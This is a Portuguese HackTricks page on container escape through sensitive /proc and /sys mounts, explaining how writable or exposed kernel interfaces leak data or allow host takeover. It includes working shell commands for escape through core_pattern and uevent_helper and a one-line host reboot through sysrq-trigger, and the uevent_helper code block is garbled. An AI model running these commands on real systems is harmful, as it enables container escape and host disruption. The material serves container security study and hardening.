# Montagens Sensíveis

<details>

<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

A exposição de `/proc` e `/sys` sem isolamento adequado de namespace introduz riscos significativos de segurança, incluindo aumento da superfície de ataque e divulgação de informações. Esses diretórios contêm arquivos sensíveis que, se mal configurados ou acessados por um usuário não autorizado, podem levar à fuga do contêiner, modificação do host ou fornecer informações que auxiliam em ataques adicionais. Por exemplo, montar incorretamente `-v /proc:/host/proc` pode contornar a proteção do AppArmor devido à sua natureza baseada em caminho, deixando `/host/proc` desprotegido.

**Você pode encontrar mais detalhes de cada vulnerabilidade potencial em** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Vulnerabilidades do procfs

### `/proc/sys`

Este diretório permite acesso para modificar variáveis do kernel, geralmente via `sysctl(2)`, e contém vários subdiretórios de preocupação:

#### **`/proc/sys/kernel/core_pattern`**

* Descrito em [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Permite definir um programa para executar na geração de arquivos de core com os primeiros 128 bytes como argumentos. Isso pode levar à execução de código se o arquivo começar com um pipe `|`.
*   **Exemplo de Teste e Exploração**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Testa acesso de escrita
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Define manipulador personalizado
sleep 5 && ./crash & # Aciona o manipulador
```

#### **`/proc/sys/kernel/modprobe`**

* Detalhado em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Contém o caminho para o carregador de módulos do kernel, invocado para carregar módulos do kernel.
*   **Exemplo de Verificação de Acesso**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Verifica acesso ao modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

* Referenciado em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Uma flag global que controla se o kernel entra em pânico ou invoca o OOM killer quando ocorre uma condição de OOM.

#### **`/proc/sys/fs`**

* Conforme [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contém opções e informações sobre o sistema de arquivos.
* O acesso de escrita pode permitir vários ataques de negação de serviço contra o host.

#### **`/proc/sys/fs/binfmt_misc`**

* Permite registrar interpretadores para formatos binários não nativos com base em seus números mágicos.
* Pode levar à escalada de privilégios ou acesso ao shell root se `/proc/sys/fs/binfmt_misc/register` for gravável.
* Exploração relevante e explicação:
* [Rootkit de homem pobre via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Tutorial detalhado: [Link do vídeo](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Outros em `/proc`

#### **`/proc/config.gz`**

* Pode revelar a configuração do kernel se `CONFIG_IKCONFIG_PROC` estiver habilitado.
* Útil para atacantes identificarem vulnerabilidades no kernel em execução.

#### **`/proc/sysrq-trigger`**

* Permite invocar comandos Sysrq, potencialmente causando reinicializações imediatas do sistema ou outras ações críticas.
*   **Exemplo de Reinicialização do Host**:

```bash
echo b > /proc/sysrq-trigger # Reinicia o host
```

#### **`/proc/kmsg`**

* Expõe mensagens do buffer de anel do kernel.
* Pode auxiliar em exploits do kernel, vazamentos de endereços e fornecer informações sensíveis do sistema.

#### **`/proc/kallsyms`**

* Lista símbolos exportados do kernel e seus endereços.
* Essencial para o desenvolvimento de exploits do kernel, especialmente para superar o KASLR.
* As informações de endereço são restritas com `kptr_restrict` definido como `1` ou `2`.
* Detalhes em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Interface com o dispositivo de memória do kernel `/dev/mem`.
* Historicamente vulnerável a ataques de escalada de privilégios.
* Mais em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Representa a memória física do sistema no formato de core ELF.
* A leitura pode vazar conteúdos de memória do host e de outros contêineres.
* O tamanho grande do arquivo pode levar a problemas de leitura ou falhas de software.
* Uso detalhado em [Despejando /proc/kcore em 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Interface alternativa para `/dev/kmem`, representando a memória virtual do kernel.
* Permite leitura e escrita, portanto, modificação direta da memória do kernel.

#### **`/proc/mem`**

* Interface alternativa para `/dev/mem`, representando a memória física.
* Permite leitura e escrita, a modificação de toda a memória requer a resolução de endereços virtuais para físicos.

#### **`/proc/sched_debug`**

* Retorna informações de agendamento de processos, contornando as proteções do namespace PID.
* Expõe nomes de processos, IDs e identificadores de cgroups.

#### **`/proc/[pid]/mountinfo`**

* Fornece informações sobre pontos de montagem no namespace de montagem do processo.
* Expõe a localização do `rootfs` ou imagem do contêiner.

### Vulnerabilidades do `/sys`

#### **`/sys/kernel/uevent_helper`**

* Usado para lidar com `uevents` de dispositivos do kernel.
* Escrever em `/sys/kernel/uevent_helper` pode executar scripts arbitrários ao acionar `uevents`.
*   **Exemplo de Exploração**: %%%bash

## Cria uma carga útil

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

## Encontra o caminho do host a partir da montagem OverlayFS para o contêiner

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

## Define uevent\_helper para o helper malicioso

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

## Aciona um uevent

echo change > /sys/class/mem/null/uevent

## Lê a saída

cat /output %%%
#### **`/sys/class/thermal`**

* Controla as configurações de temperatura, potencialmente causando ataques de DoS ou danos físicos.

#### **`/sys/kernel/vmcoreinfo`**

* Vaza endereços do kernel, comprometendo potencialmente o KASLR.

#### **`/sys/kernel/security`**

* Abriga a interface `securityfs`, permitindo a configuração de Módulos de Segurança Linux como AppArmor.
* O acesso pode permitir que um contêiner desative seu sistema MAC.

#### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**

* Expõe interfaces para interagir com variáveis EFI na NVRAM.
* Má configuração ou exploração pode resultar em laptops inutilizáveis ou máquinas host iniciais.

#### **`/sys/kernel/debug`**

* `debugfs` oferece uma interface de depuração "sem regras" para o kernel.
* Histórico de problemas de segurança devido à sua natureza irrestrita.

### Referências

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Compreensão e Reforço de Contêineres Linux](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusando de Contêineres Linux Privilegiados e Não Privilegiados](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
